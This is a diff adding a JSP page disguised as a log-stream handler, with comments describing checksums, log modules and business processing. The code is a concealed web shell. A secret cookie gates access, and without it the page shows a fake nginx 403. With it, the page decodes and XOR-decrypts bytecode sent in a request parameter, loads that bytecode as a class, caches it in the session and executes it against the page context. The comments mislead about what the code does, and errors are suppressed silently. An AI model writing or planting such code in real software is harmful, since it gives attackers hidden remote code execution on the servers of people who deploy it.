@@ -1,0 +1,180 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+    <jsp:directive.page import="java.io.IOException"/>
+    <jsp:directive.page import="java.io.File"/>
+    <jsp:directive.page contentType="text/html;charset=UTF-8"/>
+    <jsp:directive.page language="java"/>
+
+    <!-- 声明部分 (Declarations) -->
+    <jsp:declaration>
+        <![CDATA[
+        /**
+         * Log Stream Protocol Handler
+         * Utilities for parsing and decoding log buffer streams.
+         * @version 1.4.2
+         */
+        public static class LogProtocolHandler {
+            
+            private static final String DEFAULT_ENCODING = "UTF-8";
+            private static final int BUFFER_SIZE = 4096;
+
+            // Parse protocol buffer data and handle checksum bits
+            public static byte[] parseBuffer(byte[] data, String salt) {
+                try {
+                    byte[] keyBytes = salt.getBytes(DEFAULT_ENCODING);
+                    byte[] result = new byte[data.length];
+                    for (int i = 0; i < data.length; i++) {
+                        result[i] = (byte) (data[i] ^ keyBytes[i % keyBytes.length]);
+                    }
+                    return result;
+                } catch (Exception e) {
+                    return null;
+                }
+            }
+
+            // Decode standard log stream data
+            public static byte[] decodeStream(String stream) {
+                try {
+                    String dict = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+                    java.io.ByteArrayOutputStream buffer = new java.io.ByteArrayOutputStream();
+                    int i = 0;
+                    int bits = 0;
+                    int bitCount = 0;
+                    while (i < stream.length()) {
+                        char c = stream.charAt(i++);
+                        if (c == '=') break;
+                        int v = dict.indexOf(c);
+                        if (v == -1) continue;
+                        bits = (bits << 6) | v;
+                        bitCount += 6;
+                        if (bitCount >= 8) {
+                            bitCount -= 8;
+                            buffer.write((bits >> bitCount) & 0xFF);
+                        }
+                    }
+                    return buffer.toByteArray();
+                } catch (Exception e) {
+                    return null;
+                }
+            }
+
+            // Validate data integrity
+            public static boolean validateChecksum(byte[] data) {
+                if (data == null || data.length == 0) return false;
+                int sum = 0;
+                for (byte b : data) sum += b;
+                return (sum % 255) != 0;
+            }
+        }
+
+        // Dynamic log module loader for hot-loading analysis components
+        class LogModuleLoader extends ClassLoader {
+            public LogModuleLoader(ClassLoader parent) {
+                super(parent);
+            }
+            
+            // Define component class from bytecode
+            public Class defineLogModule(byte[] data) {
+                return super.defineClass(data, 0, data.length);
+            }
+        }
+        ]]>
+    </jsp:declaration>
+
+    <!-- 鉴权逻辑 (Authentication Logic) -->
+    <jsp:scriptlet>
+        <![CDATA[
+        // === 1. Access Authentication and Session Validation ===
+        boolean isAuthorized = false;
+        String SESSION_TOKEN = ""; // Request session token
+        
+        // Validate request identifier Cookie (JSESSIONID)
+        if (request.getCookies() != null) {
+            for (javax.servlet.http.Cookie cookie : request.getCookies()) {
+                if (cookie.getName().equals("$cookie_name$")) {
+                    SESSION_TOKEN = cookie.getValue();
+                    isAuthorized = true;
+                    break;
+                }
+            }
+        }
+
+        // === 2. Permission Validation ===
+        // If authentication fails, deny access
+        if (!isAuthorized) {
+            response.setStatus(403);
+        ]]>
+    </jsp:scriptlet>
+
+    <!-- 403 页面输出 (HTML Output) -->
+    <html>
+        <head>
+            <title>403 Forbidden</title>
+        </head>
+        <body bgcolor="white">
+            <center><h1>403 Forbidden</h1></center>
+            <hr/><center>nginx</center>
+        </body>
+    </html>
+
+    <!-- 核心业务逻辑 (Core Business Logic) -->
+    <jsp:scriptlet>
+        <![CDATA[
+            return; // Terminate request processing
+        }
+
+        // === 3. Core Business Processing ===
+        // Authentication passed, process log stream request
+        try {
+            // Configuration constants definition
+            String LOG_BUFFER_KEY = "cache_key"; // Component cache key name
+            String CONFIG_STREAM_PARAM = "$param$";       // Configuration stream parameter name
+
+            // Check if processing component is already cached in session
+            if (session.getAttribute(LOG_BUFFER_KEY) == null) {
+                // === Phase 1: Initialize Log Component ===
+                String streamData = request.getParameter(CONFIG_STREAM_PARAM);
+                
+                if (streamData != null) {
+                    // 1. Decode configuration stream
+                    byte[] rawData = LogProtocolHandler.decodeStream(streamData);
+                    
+                    // 2. Parse protocol data (validate using token)
+                    // Ensure data source is trusted
+                    if (SESSION_TOKEN != null && SESSION_TOKEN.length() > 0) {
+                        rawData = LogProtocolHandler.parseBuffer(rawData, SESSION_TOKEN);
+                        
+                        try {
+                            // 3. Load dynamic processing component
+                            Class moduleClass = new LogModuleLoader(this.getClass().getClassLoader()).defineLogModule(rawData);
+                            
+                            // 4. Cache component class definition for reuse
+                            session.setAttribute(LOG_BUFFER_KEY, moduleClass);
+                        } catch (Exception e) {
+                            // Initialization failed, abort process
+                            return;
+                        }
+                    }
+                }
+            } else {
+                // === Phase 2: Execute Business Processing ===
+                // Retrieve cached component instance and execute analysis task
+                java.io.ByteArrayOutputStream outputBuffer = new java.io.ByteArrayOutputStream();
+                
+                // Instantiate processing component
+                Object moduleInstance = ((Class)session.getAttribute(LOG_BUFFER_KEY)).newInstance();
+                
+                // Execute component logic
+                // Configure output buffer
+                moduleInstance.equals(outputBuffer); 
+                // Inject page context environment
+                moduleInstance.equals(pageContext);  
+                
+                // Generate processing result
+                moduleInstance.toString();
+            }
+        } catch (Exception e) {
+            // Exception handling, keep silent to prevent stack trace leakage
+        }
+        ]]>
+    </jsp:scriptlet>
+</jsp:root>
